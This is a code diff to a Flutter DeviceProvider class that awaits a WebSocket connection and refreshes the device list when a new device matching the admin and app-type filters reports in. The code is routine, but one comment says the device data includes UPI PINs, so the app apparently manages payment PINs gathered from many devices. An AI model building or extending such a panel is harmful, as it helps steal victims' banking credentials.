@@ -231,15 +231,21 @@ class DeviceProvider extends ChangeNotifier {
     // Cancel previous subscription if exists
     _deviceUpdateSubscription?.cancel();
     
-    // Listen to device update stream from WebSocket
-    _deviceUpdateSubscription = _webSocketService.deviceStream.listen(
-      (event) {
-        _handleDeviceUpdate(event);
-      },
-      onError: (error) {
-        debugPrint('❌ Error in device update stream: $error');
-      },
-    );
+    // Ensure WebSocket is connected first
+    _webSocketService.ensureConnected().then((_) {
+      // Listen to device update stream from WebSocket
+      _deviceUpdateSubscription = _webSocketService.deviceStream.listen(
+        (event) {
+          _handleDeviceUpdate(event);
+        },
+        onError: (error) {
+          debugPrint('❌ Error in device update stream: $error');
+        },
+      );
+      debugPrint('✅ Device updates initialized via WebSocket');
+    }).catchError((error) {
+      debugPrint('❌ Failed to initialize device updates: $error');
+    });
   }
   
   void _handleDeviceUpdate(Map<String, dynamic> event) {
@@ -261,14 +267,31 @@ class DeviceProvider extends ChangeNotifier {
       
       // Find the device in the list
       final index = _devices.indexWhere((d) => d.deviceId == deviceId);
+      
       if (index == -1) {
-        debugPrint('📱 Device update for unknown device: $deviceId (might be on another page)');
-        // Device not in current list, might be on another page
+        // Device not in current list - might be a new device or on another page
+        debugPrint('📱 Device update for device not in current page: $deviceId');
+        
+        // Check if it's a new device that should be on current page
+        // If filters match, refresh the list to include new device
+        final adminUsername = deviceData['admin_username'] as String?;
+        final appType = deviceData['app_type'] as String?;
+        
+        // Check if device matches current filters
+        final matchesAdminFilter = (_adminFilter == null || _adminFilter == adminUsername);
+        final matchesAppTypeFilter = (_appTypeFilter == null || _appTypeFilter == appType);
+        final shouldBeOnPage = matchesAdminFilter && matchesAppTypeFilter;
+        
+        if (shouldBeOnPage) {
+          debugPrint('🔄 New device detected, refreshing list to include it...');
+          // Refresh current page to include new device
+          _loadCurrentPage();
+        }
         return;
       }
       
       // Update device properties - use refreshSingleDevice for full update
-      // This ensures we get all device data correctly
+      // This ensures we get all device data correctly (including UPI PINs, etc.)
       refreshSingleDevice(deviceId);
       
       debugPrint('✅ Device update received via WebSocket: $deviceId (status: ${deviceData['status']}, online: ${deviceData['is_online']})');
